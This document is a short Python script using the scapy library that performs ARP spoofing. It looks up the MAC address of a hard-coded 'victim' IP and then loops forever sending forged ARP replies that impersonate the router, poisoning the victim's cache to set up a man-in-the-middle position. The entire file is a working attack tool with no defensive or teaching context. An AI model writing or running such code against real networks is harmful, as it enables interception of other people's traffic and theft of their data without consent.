import scapy.all as scapy 

def send_spoofed_arp(target_ip, target_mac, spoof_ip):
    arp_packet = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op="is-at")
    scapy.send(arp_packet, verbose=0)

def retrieve_mac_address(ip_address):
    arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip_address)
    response, _ = scapy.srp(arp_request, timeout=3, verbose=0)
    if response:
        return response[0][1].src
    return None

router_ip = "10.0.0.138"
victim_ip = "10.0.0.12"

victim_mac = None
while not victim_mac:
    victim_mac = retrieve_mac_address(victim_ip)
    if not victim_mac:
        print("MAC address for the victim not found \n")
print("Victim MAC address is: {}".format(victim_mac))

while True:
    send_spoofed_arp(victim_ip, victim_mac, router_ip)
    print("ARP Spoofing is active.")
